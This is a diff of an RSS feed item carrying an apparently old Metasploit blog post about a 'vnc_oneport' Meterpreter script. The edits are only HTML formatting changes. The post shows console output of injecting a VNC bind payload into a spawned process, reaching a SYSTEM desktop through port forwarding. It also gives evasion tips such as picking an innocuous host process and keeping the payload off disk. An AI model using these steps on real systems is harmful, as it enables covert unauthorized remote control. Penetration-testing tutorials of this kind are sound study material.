@@ -33,7 +33,7 @@
 &lt;p&gt;&lt;a href=&#34;https://gist.github.com/mubix/8215705&#34;&gt;enum_vnc_pw.rb&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;If you have a check, find it breaks for some reason or another, or just want to tell me that I suck, please leave a comment or email me.&lt;/p&gt;
 &lt;p&gt;Here it is in action against my VM with 3 different VNC servers on it (calling the post module in two separate ways) :&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;msf exploit(handler) &amp;gt; sessions -i 1
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;msf exploit(handler) &amp;gt; sessions -i 1
 [*] Starting interaction with 1...
 
 meterpreter &amp;gt; getuid
@@ -114,7 +114,7 @@ meterpreter &amp;gt;
 &lt;p&gt;Or you can get it via the SVN at &lt;a href=&#34;https://metasploit.com/redmine/projects/framework/repository/revisions/7872&#34;&gt;Revision 7872&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;By creating a bind payload instead of a reverse connect we can have the payload listen locally. Then with portfwd command (just like on your home router) we forward a local port to the local host on the remote side, to the binded port. Connecting to the freshly bound port as if we were actually doing everything on the box itself. Creating a new session and a nice beautiful VNC window.&lt;/p&gt;
 &lt;h2 id=&#34;options&#34;&gt;Options:&lt;/h2&gt;
-&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; run vnc_oneport -h
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;meterpreter &amp;gt; run vnc_oneport -h
 
 OPTIONS:  
 -e &amp;lt;opt&amp;gt; The process to run and inject into (default: notepad.exe)  
@@ -124,7 +124,7 @@ OPTIONS:
 
 meterpreter &amp;gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;example-run&#34;&gt;Example Run:&lt;/h2&gt;
-&lt;pre&gt;&lt;code&gt;[*] Meterpreter session 1 opened (192.168.92.103:4444 -&amp;gt; 192.168.92.113:1038)
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[*] Meterpreter session 1 opened (192.168.92.103:4444 -&amp;gt; 192.168.92.113:1038)
 
 meterpreter &amp;gt; **_run vnc_oneport_**
 [*] Creating a VNC stager: RHOST=127.0.0.1 LPORT=1207
@@ -139,7 +139,7 @@ meterpreter &amp;gt; **_run vnc_oneport_**
 meterpreter &amp;gt; [*] VNC Server session 2 opened (127.0.0.1:56893 -&amp;gt; 127.0.0.1:5901)
 Connected to RFB server, using protocol version 3.3
 No authentication needed
-Desktop name &amp;quot;VNCShell [SYSTEM@WORKSTATION1] - Full Access&amp;quot;
+Desktop name &amp;#34;VNCShell [SYSTEM@WORKSTATION1] - Full Access&amp;#34;
 VNC server default format:
 32 bits per pixel.
 Least significant byte first in each pixel.
@@ -166,7 +166,7 @@ meterpreter &amp;gt; run vnc_oneport
 meterpreter &amp;gt; [*] VNC Server session 2 opened (127.0.0.1:56893 -&amp;gt; 127.0.0.1:5901)  
 Connected to RFB server, using protocol version 3.3  
 No authentication needed  
-Desktop name &amp;quot;VNCShell [SYSTEM@WORKSTATION1] - Full Access&amp;quot;VNC server default format: 32 bits per pixel. Least significant byte first in each pixel. True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0  
+Desktop name &amp;#34;VNCShell [SYSTEM@WORKSTATION1] - Full Access&amp;#34;VNC server default format: 32 bits per pixel. Least significant byte first in each pixel. True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0  
 Using default colormap which is TrueColor.  Pixel format: 32 bits per pixel. Least significant byte first in each pixel. True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0  
 Using shared memory PutImageSame machine: preferring raw encodingShmCleanup called  
 [*] VNC Server session 2 closed.
@@ -174,21 +174,22 @@ Using shared memory PutImageSame machine: preferring raw encodingShmCleanup call
 meterpreter &amp;gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;note&#34;&gt;Note:&lt;/h2&gt;
 &lt;p&gt;The forwarded port does not close even if the meterpreter session is ended, so use the following command to close the forward:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; portfwd delete -l 5901  
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;meterpreter &amp;gt; portfwd delete -l 5901  
 [*] Successfully stopped TCP relay on 0.0.0.0:5901
 meterpreter &amp;gt;
 
 (Note to BT4 users: do a `apt-get install vncviewer` before using any of the vnc payloads in Metasploit)
 
-The script utilizes just one of the millions of way you can leverage &#39;portfwd&#39; in your endeavors. But where it gets interesting is the fact that the delivery method for the payload never touches disk. That magic is all credited to HD though. What happens is a new process is created (notepad by default) and the newly created VNC bind payload is injected into it. But, the beauty is that it&#39;s doing local connections via the port forwarding so all you see in TCPView is:
+The script utilizes just one of the millions of way you can leverage &amp;#39;portfwd&amp;#39; in your endeavors. But where it gets interesting is the fact that the delivery method for the payload never touches disk. That magic is all credited to HD though. What happens is a new process is created (notepad by default) and the newly created VNC bind payload is injected into it. But, the beauty is that it&amp;#39;s doing local connections via the port forwarding so all you see in TCPView is:
 
 ![](/images/postimages/200912_vnc_2.png)
 
-Now it&#39;s definitely suspicious that Notepad has any connections at all, but you can use the option `-e` to provide any executable you wish, as long as it&#39;s in the path for the system. For examples, look at what&#39;s running naturally already.
+Now it&amp;#39;s definitely suspicious that Notepad has any connections at all, but you can use the option `-e` to provide any executable you wish, as long as it&amp;#39;s in the path for the system. For examples, look at what&amp;#39;s running naturally already.
 
 Plus, you would probably not be using port 4444 for a meterpreter session. But what I wanted to demonstrate with this script is the power of both meterpreter, and port forwarding.
 
-Now it&#39;s your turn to make it better. Take a look at the guts, see if anything will help you in your scripting.&lt;/code&gt;&lt;/pre&gt;</description>
+Now it&amp;#39;s your turn to make it better. Take a look at the guts, see if anything will help you in your scripting.
+&lt;/code&gt;&lt;/pre&gt;</description>
     </item>
     
   </channel>
